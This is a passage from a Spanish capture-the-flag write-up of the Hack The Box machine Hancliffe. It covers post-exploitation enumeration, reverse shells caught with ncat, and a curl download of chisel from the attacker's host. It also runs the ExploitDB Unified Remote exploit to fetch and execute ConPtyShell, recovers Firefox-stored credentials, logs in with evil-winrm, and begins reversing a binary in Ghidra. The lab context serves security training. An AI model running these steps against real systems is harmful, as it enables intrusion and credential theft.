+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.115.
+Ncat: Connection from 10.10.11.115:51152.
+^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class=code-cyan>$</span> <span class=code-dark-green>stty</span> raw -echo; <span class=code-dark-green>fg</span>
+[1]  + continued  ncat -nlvp 4444
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6  
+
+PS C:\Nuxeo&gt;
+</code></pre></div><h2 id=enumeración-del-sistema>Enumeración del sistema</h2><p>Existen algunos usuarios(<code>clara</code>, <code>development</code> y <code>Administrator</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>PS C:\Nuxeo&gt; <span class=code-yellow>dir</span> C:\Users
+
+
+    Directory: C:\Users
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        11/30/2021   9:54 AM                Administrator  
+d-----        11/30/2021   9:54 AM                clara
+d-----         6/26/2021  10:35 PM                development
+d-r---          6/3/2021   7:00 AM                Public
+d-----        11/30/2021   9:54 AM                svc_account
+
+PS C:\Nuxeo&gt; <span class=code-yellow>tree</span> C:\Users
+Folder PATH listing
+Volume serial number is 00000077 B0F6:2F1B
+C:\USERS
+├───Administrator
+├───clara
+├───development
+├───Public
+│   ├───Documents
+│   ├───Downloads
+│   ├───Music
+│   ├───Pictures
+│   └───Videos
+└───svc_account
+    ├───.nxshell
+    ├───3D Objects
+    ├───Contacts
+    ├───Desktop
+    ├───Documents
+    │   └───WindowsPowerShell
+    ├───Downloads
+    ├───Favorites
+    │   └───Links
+    ├───Links
+    ├───Music
+    ├───OneDrive
+    ├───Pictures
+    │   ├───Camera Roll
+    │   └───Saved Pictures
+    ├───Saved Games
+    ├───Searches
+    └───Videos
+</code></pre></div><p>Podemos mostrar algunas configuraciones de red:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>PS C:\Nuxeo&gt; <span class=code-yellow>ipconfig</span>
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::111
+   IPv6 Address. . . . . . . . . . . : dead:beef::f0d6:7043:d0e5:2d98
+   Temporary IPv6 Address. . . . . . : dead:beef::ac37:ca27:2783:1789
+   Link-local IPv6 Address . . . . . : fe80::f0d6:7043:d0e5:2d98%7
+   IPv4 Address. . . . . . . . . . . : 10.10.11.115
+   Subnet Mask . . . . . . . . . . . : 255.255.254.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:324%7
+                                       10.10.10.2
+PS C:\Nuxeo&gt; <span class=code-yellow>netstat</span> <span class=code-grey>-nat</span> | <span class=code-yellow>Select-String</span> LISTEN
+
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost  
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:5432           0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:9321           0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:9510           0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:9512           0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:9512           0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:9999           0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       InHost
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       InHost
+  TCP    10.10.11.115:139       0.0.0.0:0              LISTENING       InHost
+  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING       InHost
+  TCP    127.0.0.1:8005         0.0.0.0:0              LISTENING       InHost
+  TCP    127.0.0.1:8009         0.0.0.0:0              LISTENING       InHost
+  TCP    127.0.0.1:8080         0.0.0.0:0              LISTENING       InHost
+  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       InHost
+  TCP    127.0.0.1:9200         0.0.0.0:0              LISTENING       InHost
+  TCP    127.0.0.1:9300         0.0.0.0:0              LISTENING       InHost
+  TCP    [::]:135               [::]:0                 LISTENING       InHost
+  TCP    [::]:445               [::]:0                 LISTENING       InHost
+  TCP    [::]:5432              [::]:0                 LISTENING       InHost
+  TCP    [::]:5985              [::]:0                 LISTENING       InHost
+  TCP    [::]:9512              [::]:0                 LISTENING       InHost
+  TCP    [::]:47001             [::]:0                 LISTENING       InHost
+  TCP    [::]:49664             [::]:0                 LISTENING       InHost
+  TCP    [::]:49665             [::]:0                 LISTENING       InHost
+  TCP    [::]:49666             [::]:0                 LISTENING       InHost
+  TCP    [::]:49667             [::]:0                 LISTENING       InHost
+  TCP    [::]:49668             [::]:0                 LISTENING       InHost
+</code></pre></div><p>También podemos ver si hay alguna ruta excluida por Windows Defender:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>PS C:\Nuxeo&gt; <span class=code-yellow>reg</span> query <span class=code-dark-cyan>'HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths'</span>  
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
+    C:\DevApp\MyFirstApp.exe    REG_DWORD    0x0
+</code></pre></div><p>Y nos muestra un binario, pero no podemos leerlo aún.</p><p>En <code>C:\Program Files (x86)</code> hay una carpeta <code>Unified Remote 3</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>PS C:\Nuxeo&gt; <span class=code-yellow>dir</span> <span class=code-dark-cyan>'C:\Program Files (x86)'</span>
+
+
+    Directory: C:\Program Files (x86)
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          6/3/2021   7:11 AM                Common Files
+d-----         10/3/2021  11:08 PM                Internet Explorer
+d-----          6/3/2021   8:09 PM                Microsoft
+d-----         12/7/2019   6:48 AM                Microsoft.NET
+d-----         6/26/2021  10:15 PM                Mozilla Maintenance Service  
+d-----         6/12/2021   2:51 AM                MSBuild
+d-----         6/12/2021   2:51 AM                Reference Assemblies
+d-----         6/12/2021  12:21 AM                Unified Remote 3
+d-----          4/9/2021   6:48 AM                Windows Defender
+d-----         7/18/2021  12:20 AM                Windows Mail
+d-----         12/7/2019   6:44 AM                Windows NT
+d-----          4/9/2021   6:48 AM                Windows Photo Viewer
+d-----         12/7/2019   1:25 AM                WindowsPowerShell
+</code></pre></div><p>El servicio utiliza el puerto 9512, que está en escucha como se mostró anteriormente en la enumeración de red.</p><h2 id=movimiento-lateral-al-usuario-clara>Movimiento lateral al usuario <code>clara</code></h2><p>Existe un <em>exploit</em> público de <code>Unified Remote 3</code> en <a href=https://www.exploit-db.com/exploits/49587>ExploitDB</a>. Para utilizarlo, debemos exponer el puerto afuera mediante <a href=https://github.com/jpillora/chisel><code>chisel</code></a>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./chisel</span> server --reverse -p 1234
+server: Reverse tunnelling enabled
+server: Fingerprint L32jA7y7l060Ux4y/lkeGtEmYY/JuhFiN+7tqA3v0TU=  
+server: Listening on http://0.0.0.0:1234
+server: session#1: tun: proxy#R:9512=>9512: Listening
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>PS C:\Nuxeo&gt; <span class=code-yellow>curl</span> 10.10.17.44/chisel.exe <span class=code-grey>-o</span> C:\Windows\Temp\c.exe
+PS C:\Nuxeo&gt; <span class=code-yellow>C:\Windows\Temp\c.exe</span> client 10.10.17.44:1234 R:9512:127.0.0.1:9512  
+client: Connecting to ws://10.10.17.44:1234
+client: Connected (Latency 77.0068ms)
+</code></pre></div><p>El <em>exploit</em> básicamente se descarga un binario desde la máquina de atacante en <code>C:\Windows\Temp</code> y luego lo ejecuta. Decidí modificar el <em>exploit</em> para utilizar <a href=https://github.com/antonioCoco/ConPtyShell><code>ConPtyShell</code></a>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python2</span> 49587.py 127.0.0.1 10.10.17.44 ConPtyShell.exe  
+[+] Connecting to target...
+[+] Popping Start Menu
+[+] Opening CMD
+[+] *Super Fast Hacker Typing*
+[+] Downloading Payload
+[+] Done! Check listener?
+</code></pre></div><p>Y conseguimos acceso como <code>clara</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.115.
+Ncat: Connection from 10.10.11.115:58167.
+^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class=code-cyan>$</span> <span class=code-dark-green>stty</span> raw -echo; <span class=code-dark-green>fg</span>
+[1]  + continued  ncat -nlvp 4444
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6  
+
+PS C:\Users\clara&gt;
+</code></pre></div><p>Aquí ya podemos leer la <em>flag</em> <code>user.txt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>PS C:\Users\clara&gt; <span class=code-yellow>type</span> Desktop\user.txt  
+3aa9dcfca7cac59c24ed2f14a0952ee7
+</code></pre></div><p>Pero seguimos sin poder leer el binario en <code>C:\DevApp</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>PS C:\Users\clara&gt; <span class=code-yellow>dir</span> C:\DevApp
+<span class=code-red>dir : Access to the path 'C:\DevApp' is denied.
+At line:1 char:1
++ dir C:\DevApp
++ ~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\DevApp:String) [Get-ChildItem], UnauthorizedAccessException  
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand</span>
+</code></pre></div><p>Si ejecutamos <a href=https://github.com/carlospolop/PEASS-ng>winPEAS</a> para enumerar más, obtenemos unas credenciales guardadas en Firefox:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-cyan>════════════════════════════════════╣</span> <span class=code-green>Browsers Information</span> <span class=code-dark-cyan>╠════════════════════════════════════</span>
+
+<span class=code-dark-cyan>╔══════════╣</span> <span class=code-green>Showing saved credentials for Firefox</span>
+     <span class=code-red>Url:           http://localhost:8000
+     Username:      hancliffe.htb
+     Password:      #@H@ncLiff3D3velopm3ntM@st3rK3y*!</span>
+
+   <span class=code-grey>=================================================================================================</span>
+
+
+<span class=code-dark-cyan>╔══════════╣</span> <span class=code-green>Looking for Firefox DBs</span>
+<span class=code-dark-cyan>╚  <span class=code-yellow>https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history</span>
+    <span class=code-red>Firefox credentials file exists at C:\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853.default-release\key4.db</span>  
+<span class=code-dark-cyan>╚</span> <span class=code-blue>Run SharpWeb (https://github.com/djhohnstein/SharpWeb)</span>
+</code></pre></div><p><a href=https://github.com/carlospolop/PEASS-ng>winPEAS</a> ya nos extrae las contraseñas de la base de datos de Firefox, aunque podríamos haber usado <a href=https://github.com/lclevy/firepwd>FirePwd</a>.</p><h2 id=movimimento-lateral-al-usuario-development>Movimimento lateral al usuario <code>development</code></h2><p>Había otro usuario llamado <code>development</code>. Podemos tratar de conectarnos al servidor utilizando <a href=https://github.com/hackplayers/evil-winrm><code>evil-winrm</code></a> (configurando <a href=https://github.com/jpillora/chisel><code>chisel</code></a> para exponer el puerto 5985):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>PS C:\Nuxeo&gt; <span class=code-yellow>C:\Windows\Temp\c.exe</span> client 10.10.17.44:1234 R:5985:127.0.0.1:5985  
+2022/03/06 17:14:36 client: Connecting to ws://10.10.17.44:1234
+2022/03/06 17:14:37 client: Connected (Latency 105.431ms)
+</code></pre></div><p>Podemos probar la contraseña para <code>development</code> pero no funciona:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>evil-winrm</span> -i 127.0.0.1 -u development -p <span class=code-dark-yellow>'#@H@ncLiff3D3velopm3ntM@st3rK3y*!'</span>
+
+<span class=code-dark-blue>Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint</span>
+
+<span class=code-dark-red>Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError  
+
+Error: Exiting with code 1</span>
+</code></pre></div><p>Aquí tenemos que recordar que había un servicio web que generaba contraseñas a partir de otros campos y una contraseña maestra (el usuario ha debido almacenar los campos del formulario en la base de datos de Firefox por usabilidad).</p><p>Si utilizamos <code>development</code>, <code>hancliffe.htb</code> y <code>#@H@ncLiff3D3velopm3ntM@st3rK3y*!</code> obtenemos <code>AMl.q2DHp?2.C/V0kNFU</code> como contraseña:</p><p><img src=/images/HTB/Hancliffe/Hancliffe-password.png alt="Hancliffe password"></p><p>Vamos a probar ahora:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>evil-winrm</span> -i 127.0.0.1 -u development -p <span class=code-dark-yellow>'AMl.q2DHp?2.C/V0kNFU'</span>  
+
+<span class=code-dark-blue>Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint</span>
+
+<span class=code-dark-red>*Evil-WinRM*</span> <span class=code-yellow>PS</span> C:\Users\development\Documents&gt;
+</code></pre></div><p>Funciona. Y ahora sí podemos acceder a <code>C:\DevApp</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>evil-winrm</span> -i 127.0.0.1 -u development -p <span class=code-dark-yellow>'AMl.q2DHp?2.C/V0kNFU'</span>  
+
+<span class=code-dark-blue>Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint</span>
+
+<span class=code-dark-red>*Evil-WinRM*</span> <span class=code-yellow>PS</span> C:\Users\development\Documents&gt; dir C:\DevApp
+
+
+    Directory: C:\DevApp
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         9/14/2021   5:02 AM          60026 MyFirstApp.exe
+-a----         9/14/2021  10:57 AM            636 restart.ps1
+</code></pre></div><p>Podemos descargar el binario a la máquina de atacante utilizando las funciones de <a href=https://github.com/hackplayers/evil-winrm><code>evil-winrm</code></a>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-dark-red>*Evil-WinRM*</span> <span class=code-yellow>PS</span> C:\Users\development\Documents&gt; download C:\DevApp\MyFirstApp.exe ./MyFirstApp.exe  
+<span class=code-dark-blue>Info: Downloading C:\DevApp\MyFirstApp.exe to ./MyFirstApp.exe
+
+
+Info: Download successful!</span>
+</code></pre></div><h2 id=ingeniería-inversa-sobre-el-binario>Ingeniería inversa sobre el binario</h2><p>Tenemos un binario ejecutable de Windows de 32 bits:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>file</span> MyFirstApp.exe
+MyFirstApp.exe: PE32 executable (console) Intel 80386, for MS Windows  
+</code></pre></div><p>Podemos utilizar <code>strings</code> para ver cosas interesantes. Por ejemplo, podemos ver el comando con el que fue compilado el binario:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>strings</span> MyFirstApp.exe | <span class=code-dark-green>grep</span> protector
+GNU C17 8.1.0 -mtune=generic -march=i686 -g -g -g -O2 -O2 -O2 -fno-ident -fbuilding-libgcc -fno-stack-<span class=code-red>protector</span>  
+</code></pre></div><p>Y también podemos encontrar usuarios, códigos y contraseñas cifradas:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>strings</span> MyFirstApp.exe | <span class=code-dark-green>grep</span> -C 10 Password
+setsockopt failed with error: %d
+bind failed with error: %d
+Waiting Connection
+listen failed with error: %d
+Accept failed with error: %d
+Connection Received
+thread cretead
+Welcome Brankas Application.
+Send failed with error: %d
+Username:
+<span class=code-red>Password</span>:
+Login Successfully!
+FullName:
+Input Your Code:
+T3D83CbJkl1299
+Vickry Alfiansyah
+Unlocked
+Wrong Code
+Recv failed with error: %d
+Username or <span class=code-red>Password</span> incorrect
+alfiansyah
+YXlYeDtsbD98eDtsWms5SyU=
+Unknown error
+_matherr(): %s in %s(%g, %g)  (retval=%g)
+Argument domain error (DOMAIN)
+Argument singularity (SIGN)
+Overflow range error (OVERFLOW)
+The result is too small to be represented (UNDERFLOW)  
+Total loss of significance (TLOSS)
+Partial loss of significance (PLOSS)
+</code></pre></div><p>Vemos también un mensaje <em>&ldquo;Welcome to Brankas Application&rdquo;</em>. Este es el mensaje mostrado por el servicio expuesto en el puerto 9999 (reportado por <code>nmap</code> al comienzo). Por tanto, tenemos el binario que produce dicho servicio.</p><p>Existe un texto que parece una contraseña codificada en Base64, vamos a decodificarla:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> YXlYeDtsbD98eDtsWms5SyU= | <span class=code-dark-green>base64</span> -d  
+ayXx;ll?|x;lZk9K%
+</code></pre></div><p>Podría ser la contraseña en texto claro, podemos tratar de usarla en remoto con el usuario <code>alfiansyah</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> 10.10.11.115 9999
+Welcome Brankas Application.
+Username: alfiansyah
+Password: ayXx;ll?|x;lZk9K%
+Username or Password incorrect  
+</code></pre></div><p>Pero no es correcta. Entonces, lo que podemos hacer es descompilar el binario con Ghidra y leer el código fuente en C generado. La función <code>main</code> básicamente arranca un servidor de <em>sockets</em> y espera nuevas conexiones. Cuando se recibe uan conexión, se crea un hilo (<em>thread</em>) que gestiona dicha conexión:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class="mtk7 mtki">__cdecl</span> <span class=mtk8>_main</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">_Argc</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span> <span class=mtk5>**</span><span class="mtk9 mtki">_Argv</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span> <span class=mtk5>**</span><span class="mtk9 mtki">_Env</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+  <span class=mtk3>//</span> <span class=mtk3>Declarations</span> <span class=mtk3>and</span> <span class=mtk3>initializations</span>
+
+  <span class=mtk1>local_1c</span> <span class=mtk5>=</span> <span class=mtk8>getaddrinfo</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk4>"9999"</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>local_1dc,</span> <span class=mtk5>&amp;</span><span class=mtk1>local_1e0);</span>
+
+  <span class=mtk5>if</span> <span class=mtk1>(local_1c</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk1>local_20</span> <span class=mtk5>=</span> <span class=mtk8>socket</span><span class=mtk1>(</span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(local_1e0</span> <span class=mtk5>+</span> <span class=mtk6>4</span><span class=mtk1>),</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(local_1e0</span> <span class=mtk5>+</span> <span class=mtk6>8</span><span class=mtk1>),</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(local_1e0</span> <span class=mtk5>+</span> <span class=mtk6>12</span><span class=mtk1>));</span>
+
+    <span class=mtk5>if</span> <span class=mtk1>(local_20</span> <span class=mtk5>==</span> <span class=mtk5>0x</span><span class=mtk6>ffffffff</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+      <span class=mtk3>//</span> <span class=mtk3>Error</span> <span class=mtk3>handling</span>
+    <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
+      <span class=mtk1>tVar3</span> <span class=mtk5>=</span> <span class=mtk8>_time</span><span class=mtk1>((</span><span class="mtk7 mtki">time_t</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk6>0</span><span class=mtk1>);</span>
+      <span class=mtk8>_srand</span><span class=mtk1>((</span><span class="mtk7 mtki">uint</span><span class=mtk1>)</span> <span class=mtk1>tVar3);</span>
+      <span class=mtk1>local_24</span> <span class=mtk5>=</span> <span class=mtk8>_rand</span><span class=mtk1>();</span>
+      <span class=mtk1>local_28</span> <span class=mtk5>=</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(local_1e0</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>18</span><span class=mtk1>);</span>
+      <span class=mtk1>local_2c</span> <span class=mtk5>=</span> <span class=mtk1>local_24</span> <span class=mtk5>%</span> <span class=mtk6>1000</span> <span class=mtk5>+</span> <span class=mtk6>9000</span><span class=mtk1>;</span>
+      <span class=mtk1>uVar1</span> <span class=mtk5>=</span> <span class=mtk8>htons</span><span class=mtk1>((</span><span class="mtk7 mtki">u_short</span><span class=mtk1>)</span> <span class=mtk1>local_2c);</span>
+      <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">u_short</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(local_28</span> <span class=mtk5>+</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk5>=</span> <span class=mtk1>uVar1;</span>
+      <span class=mtk8>_printf</span><span class=mtk1>(</span><span class=mtk4>"Server</span> <span class=mtk4>Started</span> <span class=mtk4>on</span> <span class=mtk4>Port</span> <span class=mtk6>%d\r\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>local_2c);</span>
+      <span class=mtk1>local_1c</span> <span class=mtk5>=</span> <span class=mtk8>setsockopt</span><span class=mtk1>(local_20,</span> <span class=mtk5>0x</span><span class=mtk6>ffff</span><span class=mtk1>,</span> <span class=mtk6>4</span><span class=mtk1>,</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span><span class=mtk1>local_1f8,</span> <span class=mtk1>local_18);</span>
+
+      <span class=mtk5>if</span> <span class=mtk1>(local_1c</span> <span class=mtk5>==</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk3>//</span> <span class=mtk3>Error</span> <span class=mtk3>handling</span>
+      <span class=mtk1>}</span>
+
+      <span class=mtk1>local_1c</span> <span class=mtk5>=</span> <span class=mtk8>bind</span><span class=mtk1>(local_20,</span> <span class=mtk5>*</span><span class=mtk1>(sockaddr</span> <span class=mtk5>**</span><span class=mtk1>)</span> <span class=mtk1>(local_1e0</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>18</span><span class=mtk1>),</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(local_1e0</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>10</span><span class=mtk1>));</span>
+
+      <span class=mtk5>if</span> <span class=mtk1>(local_1c</span> <span class=mtk5>==</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk3>//</span> <span class=mtk3>Error</span> <span class=mtk3>handling</span>
+      <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
+        <span class=mtk8>_puts</span><span class=mtk1>(</span><span class=mtk4>"Waiting</span> <span class=mtk4>Connection</span><span class=mtk6>\r</span><span class=mtk4>"</span><span class=mtk1>);</span>
+        <span class=mtk1>local_1c</span> <span class=mtk5>=</span> <span class=mtk8>listen</span><span class=mtk1>(local_20,</span> <span class=mtk5>0x</span><span class=mtk6>7fffffff</span><span class=mtk1>);</span>
+
+        <span class=mtk5>if</span> <span class=mtk1>(local_1c</span> <span class=mtk5>==</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+          <span class=mtk3>//</span> <span class=mtk3>Error</span> <span class=mtk3>handling</span>
+        <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
+          <span class=mtk5>while</span> <span class=mtk1>(local_20</span> <span class=mtk5>!=</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+            <span class=mtk1>local_14</span> <span class=mtk5>=</span> <span class=mtk1>(LPVOID)</span> <span class=mtk8>accept</span><span class=mtk1>(local_20,</span> <span class=mtk5>&amp;</span><span class=mtk1>local_1f0,</span> <span class=mtk5>&amp;</span><span class=mtk1>local_1f4);</span>
+
+            <span class=mtk5>if</span> <span class=mtk1>(local_14</span> <span class=mtk5>==</span> <span class=mtk1>(LPVOID)</span> <span class=mtk5>0x</span><span class=mtk6>ffffffff</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+              <span class=mtk3>//</span> <span class=mtk3>Error</span> <span class=mtk3>handling</span>
+            <span class=mtk1>}</span>
+            <span class=mtk8>_puts</span><span class=mtk1>(</span><span class=mtk4>"Connection</span> <span class=mtk4>Received</span><span class=mtk6>\r</span><span class=mtk4>"</span><span class=mtk1>);</span>
+            <span class=mtk8>CreateThread</span><span class=mtk1>((LPSECURITY_ATTRIBUTES)</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk1>(LPTHREAD_START_ROUTINE)</span> <span class=mtk5>&amp;</span><span class=mtk1>_cHandler@</span><span class=mtk6>4</span><span class=mtk1>,</span> <span class=mtk1>local_14,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk1>(LPDWORD)</span> <span class=mtk6>0</span><span class=mtk1>);</span>  
+          <span class=mtk1>}</span>
+
+          <span class=mtk8>closesocket</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
+          <span class=mtk8>WSACleanup</span><span class=mtk1>();</span>
+          <span class=mtk1>iVar2</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+        <span class=mtk1>}</span>
+      <span class=mtk1>}</span>
+    <span class=mtk1>}</span>
+  <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
+    <span class=mtk3>//</span> <span class=mtk3>Error</span> <span class=mtk3>handling</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk5>return</span> <span class=mtk1>iVar2;</span>
+<span class=mtk1>}</span>
